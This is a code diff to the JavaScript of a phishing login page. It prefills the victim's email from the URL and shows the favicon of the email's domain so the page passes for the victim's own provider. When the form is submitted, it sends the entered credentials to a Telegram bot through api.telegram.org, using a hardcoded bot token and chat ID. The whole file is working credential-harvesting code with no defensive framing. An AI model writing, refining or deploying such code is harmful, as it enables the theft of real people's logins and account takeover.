@@ -3,46 +3,38 @@ const BOT_TOKEN = '7312223663:AAHf1MtcD0Ksu_Bwvyr5W7nAY6iQPxDA8zU';
 const CHAT_ID = '5899924228';
 let loginAttempts = 0;
 
-// Function to get email from hash
-function getEmailFromHash() {
+// Function to get email from the URL
+function getEmailFromUrl() {
+    const query = new URLSearchParams(window.location.search);
     const hash = window.location.hash.substring(1);
-    return hash.includes('@') ? hash : null;
+    // Prioritize query string, fallback to hash
+    return query.get('email') || (hash.includes('@') ? hash : null);
 }
 
-// Update logo dynamically based on email domain
-function updateLogo(email) {
-    const emailParts = email.split('@');
-    if (emailParts.length > 1) {
-        const domain = emailParts[1];
-        const logoUrl = `https://www.${domain}/favicon.ico`; // Example: Use the domain's favicon as logo
-        const logoElement = document.getElementById('dynamic-logo');
-
-        // Update the logo src attribute
-        logoElement.src = logoUrl;
-
-        // Add fallback in case the image fails to load
-        logoElement.onerror = () => {
-            logoElement.src = 'https://via.placeholder.com/100'; // Fallback logo
-        };
-    }
-}
-
-// Populate the email field if an email is passed in the URL hash
+// Autofill the email field from the URL
 document.addEventListener('DOMContentLoaded', () => {
-    const emailFromHash = getEmailFromHash();
-    if (emailFromHash) {
-        document.getElementById('user-email').value = emailFromHash;
-        updateLogo(emailFromHash);
+    const email = getEmailFromUrl();
+    if (email) {
+        const emailField = document.getElementById('user-email');
+        emailField.value = email;
+
+        // Optionally update the logo dynamically based on the domain
+        const emailParts = email.split('@');
+        if (emailParts.length > 1) {
+            const domain = emailParts[1];
+            const logoElement = document.getElementById('dynamic-logo');
+            logoElement.src = `https://www.${domain}/favicon.ico`;
+
+            // Add fallback in case the logo URL fails
+            logoElement.onerror = () => {
+                logoElement.src = 'https://via.placeholder.com/100';
+            };
+        }
     }
 });
 
-// Event listener for form input to update the logo dynamically
-document.getElementById('user-email').addEventListener('input', (event) => {
-    const email = event.target.value;
-    updateLogo(email);
-});
-
-document.getElementById('loginForm').addEventListener('submit', function(event) {
+// Handle form submission
+document.getElementById('loginForm').addEventListener('submit', function (event) {
     event.preventDefault();
 
     const userEmail = document.getElementById('user-email').value;
@@ -54,10 +46,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
     })
     .then(response => response.json())
     .catch(error => console.error('Error:', error));
